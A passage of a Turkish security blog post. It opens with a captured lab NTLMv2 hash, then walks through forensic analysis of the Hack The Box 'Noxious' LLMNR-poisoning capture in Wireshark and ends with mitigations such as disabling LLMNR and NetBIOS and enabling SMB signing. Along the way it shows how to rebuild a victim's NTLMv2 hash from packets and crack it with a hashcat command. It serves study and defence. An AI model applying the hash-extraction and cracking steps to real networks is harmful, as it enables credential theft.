clusteragent::INLANEFREIGHT:DDE2499898DC735E:772F714F6061E2423B8086A7C18BE5BE:010100000000000053EE3184D2D4DC011401ACEF34FE0AAC0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080053EE3184D2D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

Hash değerlerini başarılı şekilde yine elde edebildik.

Bundan sonrası önceden de yaptığımız gibi bu hash değerlerini kırarak gerçek parola değerlerini elde etmek olacaktır.

---

## **Mavi Takım Gözünden LLMNR/NBT-NS Poisoning**

Bu tarz saldırılarda ağ trafiği çok fazla veri içerdiğinden, kurumsal ortamlardaki devasa trafik hacmi nedeniyle, anomalileri tespit etmek amacıyla ağ incelemesi yapmak giderek zorlaşmaktadır. Bu nedenle, kötü niyetli faaliyetlere dair herhangi bir kanıt bulmak için tam olarak nereye odaklanmamız gerektiğini bilmemiz gerekiyor.

LLMNR poisoning saldırısını incelemek için **Hack The Box** platformundaki **Noxious** Sherlock makinesinin ağ trafiğini analiz edeceğiz. <a href="https://app.hackthebox.com/sherlocks/Noxious" target="_blank" rel="noopener noreferrer">Noxious</a>

İlk olarak senaryoyu inceleyelim:

> The IDS device alerted us to a possible rogue device in the internal Active Directory network. The Intrusion Detection System also indicated signs of LLMNR traffic, which is unusual. It is suspected that an LLMNR poisoning attack occurred. The LLMNR traffic was directed towards Forela-WKstn002, which has the IP address 172.17.79.136. A limited packet capture from the surrounding time is provided to you, our Network Forensics expert. Since this occurred in the Active Directory VLAN, it is suggested that we perform network threat hunting with the Active Directory attack vector in mind, specifically focusing on LLMNR poisoning.

Bizden istenen şey oldukça açıktır. Şimdi senaryonun ek kısmından gerekli dosyaları indirelim ve wireshark ile açarak analiz etmeye başlayalım.

![Wireshark](wireshark.png)

> Güvenlik ekibi, Forela'nın iç ağında LLMNR Zehirleme saldırısı gerçekleştirmek üzere responder aracını çalıştıran bir kötü niyetli cihazın bulunduğundan şüpheleniyor. Lütfen bu cihazın kötü niyetli IP adresini bulun.

LLMNR <a href="/posts/active-directory-llmnr_nbtns-poisoning/#llmnr-ve-nbt-ns-nedir">LLMNR ve NBT-NS Nedir?</a> kısmında da bahsettiğimiz gibi varsayılan olarak **5355** numaralı UDP bağlantı noktası üzerinden çalışmaktadır, bu yüzden bu porta göre filtreleme yaparak elimizdeki büyük trafikten sadece LLMNR trafiğine kadar daraltabiliriz.

```
udp.port == 5355
```

![port-filter](port-filter.png)

Source ve Destination kısımlarındaki IP adreslerine baktığımızda, **172.17.79.136** IP adresinin *“DCC01”* adlı bir DNS sorgusu yaptığını ve bu sorguya **172.17.79.135** IP adresinin yanıt verdiğini görüyoruz. 

Burada yapılan sorgunun **DCC01** olduğunu görebiliyoruz. **DCC01** adı yanlış yazılmış gibi durmaktadır, muhtemelen hostname DC01'dir. Buradan kurban kişinin DC01 e ulaşmak istediğini ancak yaptığı bir yazım hatasından dolayı DNS çözümlemesinin başarısız olmasına ve LLMNR protokolünün devreye girmesine neden olduğunu ve bu durumun sonucunda ise saldırganın oluşturdupu sahte LLMNR sunucusunun, Domain Controller gibi davranarak kurbanın kimlik bilgilerini istemesine ve yakalamasına sebep olduğunu söyleyebiliriz.

![DC](dc01.png)

Normal şartlarda bu sorguya yanıt veren IP adresinin `172.17.79.4` yani Domain Controller olması gerekirdi.

<br>

> Sorunlu bilgisayarın ana bilgisayar adı nedir?

Bundan sonra yapacağımız işlem bu teorimizi biraz daha doğrulamaya çalışmak olacaktır. 

Şüphelinin hostname'ini bulabilmek için DHCP trafiğine bakabiliriz, cihaz ağda yeni bir IP adresi aldığında DHCP protokolü üzerinden bu bilgiyi yayınlar. Bu yayın sırasında cihazın hostname'i de gönderilir, bu sayede şüphelinin hostname'ini öğrenebiliriz.

![DHCP Request](dhcp.png)

Potansiyel saldırgan olarak düşündüğümüz kaynağın hostname'inin **kali** olduğunu gördük, burada iki tane önemli nokta var:

- Bu hostname'in etki alanına dahil olmadığını
- Genellikle saldırganların ve pentesterların kullandığı bir hostname olduğunu

Bilgilerini elde ediyoruz.

> Şimdi saldırganın kullanıcının hash değerini ele geçirip geçirmediğini ve bu değerin kırılabilir olup olmadığını doğrulamamız gerekiyor!! Hash değeri ele geçirilen kullanıcı adı nedir?

Protokol hiyerarşisi üzerinden kontrol ettiğimizde SMB protokolünün kullanıldığını görüyoruz. 

![Protokol Hiyerarşisi](hierarchy.png)

Gönderilen kimlik bilgilerini tespit edebilmek için SMB protokolüne göre filtreleme yaparak trafiği daraltabiliriz.

```
smb2
```

![SMB Filter](smb2.png)

Fazlasıyla NTLM Authentication Negotiate mesajı olduğunu görüyoruz. Sadece negotiate paketlerini görmek ve diğer SMB paketlerini filtrelemek için **`ntlmssp`** filtresini kullanabiliriz.

Yani kısaca istemci ile sunucu arasındaki login adımlarını filtreliyoruz.

- NTLMSSP_NEGOTIATE
- NTLMSSP_CHALLENGE
- NTLMSSP_AUTH

![NTLMSSP](ntlmssp.png)

Buradan **FORELA/john.deacon** adlı domain kullanıcısı için art arda kimlik doğrulama işlemlerinin yapıldığını görüyoruz.

![John Deacon](auth.png)

Varsayılan olarak IP adreslerini göremiyoruz, bu yüzden aşağıdaki şekilde bunu aktif ediyoruz.

![Ad Çözümleme](name-res.png)

Sonuç:

![Ad Çözümleme](name-res2.png)


---

### **Hash Tespit Etme**

> NTLM trafiğinde, kurbanın kimlik bilgilerinin saldırganın bilgisayarına birçok kez iletildiğini görebiliriz. Hash değerleri ilk olarak ne zaman yakalandı?

Bu adım oldukça kritiktir çünkü saldırganın hash değerlerini ele geçirip geçirmediğini ve bu değerlerin kırılabilir olup olmadığını doğrulamamız gerekiyor.

Tekrar NTLM kimlik doğrulama trafiğine gidelim. **`ntlmssp`**

NTLM kimlik doğrulama ve negotiate paketleri 3 paketlik gruplar halinde gerçekleşmektedir.

1. NTLMSSP_NEGOTIATE packet.

2. NTLMSSP_CHALLENGE packet.

3. NTLMSSP_AUTH packet.



Hash değerlerini ele geçirmek için bu üç paketten oluşan oturum setlerinden birini ayrıştırmamız gerekiyor. İlk NTLM oturum setini inceleyerek gerekli alanları tek tek çıkaracağız.

Amacımız aşağıdaki formata uygun bir NTLMv2 hash oluşturmaktır:

```
User::Domain:ServerChallenge:NTProofStr:NTLMv2Response
```

Bu format, elde edilen NTLMv2 kimlik doğrulama verilerini Hashcat veya John the Ripper gibi araçlarda kullanabilmek için gereklidir.

---

#### **User Değerinin Çıkarılması**

İlk olarak **NTLMSSP_NEGOTIATE** paketini açıyoruz. Daha sonra paket detaylarında aşağıdaki yolu izleyerek kullanıcı adını bulabiliriz:

![User](user.png)

Buradaki **Account** alanı kullanıcı adını temsil etmektedir.

```
john.deacon
```
---

#### **Domain Değerinin Çıkarılması**

Aynı NTLMSSP_NEGOTIATE paketi içinde domain bilgisi de yer almaktadır.

![Domain](domain.png)

Bu değer hash formatındaki Domain kısmına yazılır. Bu aşamada elimizde:

```
john.deacon::FORELA
```

bilgisi oluşur.

---

#### **ServerChallenge Değerinin Çıkarılması**

Daha sonra ikinci paket olan **NTLMSSP_CHALLENGE** paketi incelenir. Bu pakette sunucunun istemciye gönderdiği challenge değeri yer alır.

![Server Challenge](serverchallenge.png)

```
601019d191f054f1
```

---

#### **NTProofStr ve NTLMv2Response Değerlerinin Çıkarılması**

Üçüncü paket olan **NTLMSSP_AUTH** paketinde istemcinin challenge’a verdiği yanıt yer alır.

![NTLMSSP_AUTH](ntproofstr-ntlmv2response.png)


NTLMv2 Response:

```
c0cc803a6d9fb5a9082253a04dbd4cd4010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000
```

NTProofStr:

```
c0cc803a6d9fb5a9082253a04dbd4cd4
```

<blockquote class="prompt-info">
Burada dikkat etmemiz gereken bir nokta vardır. NTProofStr değeri, NTLMv2 Response değerinin ilk 32 karakteridir. Bu nedenle, NTProofStr'yi elde etmek için NTLMv2 Response değerinin ilk 32 karakterini alırız.
Bu nedenle NTLMv2 Response değerinden ilk 32 karakteri silmemiz gerekmektedir.
</blockquote>

<br>

Bu bilgileri birleştirdiğimizde elimizde aşağıdaki gibi bir NTLMv2 hash değeri oluşur:

```
john.deacon::FORELA:601019d191f054f1:c0cc803a6d9fb5a9082253a04dbd4cd4:010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000
```

> Şifrenin karmaşıklığını test etmek için, paket yakalama işlemiyle elde edilen bilgilerden şifreyi geri kazanmayı deneyin. Bu, saldırganın şifreyi kırıp kırmadığını ve bunu ne kadar hızlı başardığını tespit edebilmemiz açısından çok önemli bir adımdır.


Bu hash değerini bir txt dosyasına kaydedelim.

Daha sonra hashcat aracını kullanarak bu hash değerini kırmayı deneyelim. Hashcat'in NTLMv2 hashlerini kırmak için kullandığı mod **5600**'dür.

```bash
hashcat -m 5600 hash.txt /opt/rockyou/rockyou.txt
```

Sonuç:

![Hashcat](hash-crack.png)

---

### **Önleme**

MITRE ATT&CK bu tekniği <a href="https://attack.mitre.org/techniques/T1557/001/">**T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay**</a> olarak sınıflandırmaktadır.

LLMNR/NBT-NS poisoning saldırılarının önüne geçebilmek için uygulanabilecek çeşitli güvenlik önlemleri bulunmaktadır. En etkili yöntemlerden biri, bu saldırının temelini oluşturan **LLMNR** ve **NBT-NS** protokollerini devre dışı bırakmaktır.

Ancak burada dikkat edilmesi gereken önemli bir nokta vardır:

<blockquote class="prompt-danger"> Bu protokollerin devre dışı bırakılması, bazı eski sistemlerde veya isim çözümleme süreçlerinde beklenmeyen problemlere yol açabilir.
</blockquote>

Bu nedenle yapılacak değişikliklerin önce test ortamında doğrulanması, ardından kontrollü biçimde canlı ortama uygulanması gerekir.

---

#### **LLMNR’nin Devre Dışı Bırakılması**

**LLMNR (Link-Local Multicast Name Resolution)**, Group Policy üzerinden merkezi olarak kapatılabilir.

Bunun için aşağıdaki yol izlenir:

```plaintext
Computer Configuration
 └── Administrative Templates
      └── Network
           └── DNS Client
                └── Turn Off Multicast Name Resolution
```

![LLMNR GPO](disable-llmnr.png)

Buradaki **“Turn Off Multicast Name Resolution”** politikası **Enabled** olarak ayarlandığında LLMNR devre dışı bırakılır.

Bu sayede istemciler, yerel ağda multicast isim çözümleme istekleri göndermeyecek ve saldırganların sahte yanıt üretme imkânı azaltılmış olacaktır.

---

#### **NBT-NS’nin Devre Dışı Bırakılması**

**NBT-NS (NetBIOS Name Service)**, LLMNR gibi doğrudan Group Policy üzerinden kapatılamaz.

Yerel olarak devre dışı bırakmak için:

```
Denetim Masası
 └── Ağ ve Paylaşım Merkezi
      └── Bağdaştırıcı Ayarlarını Değiştir
           └── Adaptör Özellikleri
                └── Internet Protocol Version 4 (TCP/IPv4)
                     └── Gelişmiş
                          └── WINS
                               └── Disable NetBIOS over TCP/IP
```

Burada **“Disable NetBIOS over TCP/IP”** seçeneği işaretlenerek NBT-NS kapatılabilir.

![Disable NetBIOS](disable-netbios.png)

---

#### **PowerShell ile NBT-NS Devre Dışı Bırakma**

Aşağıdaki PowerShell betiği ile istemciler üzerinde NetBIOS devre dışı bırakılabilir:

```powershell
$regkey = "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"

Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

Bu script, tüm ağ arayüzlerinde **NetbiosOptions** değerini **2** yaparak NetBIOS’u devre dışı bırakır.

---


#### **SYSVOL Üzerinden Merkezi Dağıtım**

Etki alanındaki tüm istemcilere aynı scripti dağıtmak için script dosyası **SYSVOL** paylaşımında tutulabilir.

Örneğin:

```plaintext
\\domain.local\SYSVOL\domain.local\scripts
```

GPO içindeki startup script olarak bu UNC yolu gösterildiğinde, etki alanındaki sistemler açılışta scripti merkezi olarak çalıştıracaktır.

Bu yöntem özellikle geniş ağlarda merkezi yönetim kolaylığı sağlar.

---

#### **SMB Signing Etkinleştirilmesi**

LLMNR/NBT-NS poisoning sonrasında saldırganlar çoğunlukla **SMB Relay** saldırısı gerçekleştirmeye çalışırlar.

Bunu önlemek için **SMB Signing** etkinleştirilmelidir.

SMB signing, SMB paketlerinin bütünlüğünü doğrular ve saldırganın SMB oturumunu başka bir sisteme aktarmasını engeller.

Bu önlem özellikle relay saldırılarının önlenmesinde kritik öneme sahiptir.

---
#### **Ağ Seviyesinde Ek Koruma Önlemleri**

Protokollerin kapatılmasının yanında aşağıdaki önlemler de uygulanabilir:


##### **IDS/IPS Kullanımı**

Ağ üzerinde çalışan **IDS/IPS** çözümleri, sahte LLMNR/NBT-NS yanıtlarını tespit edip engelleyebilir.

Özellikle aşağıdaki davranışlar izlenmelidir:

* Ani LLMNR yanıtları
* Çok sayıda NBNS cevabı
* Şüpheli SMB relay denemeleri

Bu tip ağ anormallikleri saldırının erken aşamada tespit edilmesini sağlayabilir.

---


## Referanslar

- <a href="https://app.hackthebox.com/sherlocks/Noxious" target="_blank" rel="noopener noreferrer">Sherlocks: Noxious</a>
- <a href="https://attack.mitre.org/techniques/T1557/001/" target="_blank" rel="noopener noreferrer">MITRE ATT&CK: LLMNR/NBT-NS Poisoning</a>
- <a href="https://www.hackthebox.com/blog/llmnr-poisoning-attack-detection" target="_blank" rel="noopener noreferrer">LLMNR Poisoning Attack Detection Hack The Box</a>

<br>

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Teşekkürler <a href="https://www.linkedin.com/in/batuhan0/?lipi=urn%3Ali%3Apage%3Ad_flagship3_search_srp
_people%3BLUebMIsyT%2Fy0mhB736RysA%3D%3D" target="_blank" rel="noopener noreferrer">@batuhaner</a></p>

<style>
  .center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
  }

  .wrap pre{
    white-space: pre-wrap;
  }

  .post-desc {
    font-family: 'Open Sans', sans-serif !important;
  }

  h4,h3,h2,h1 {
    font-family: 'Open Sans', sans-serif !important;
  }

</style>
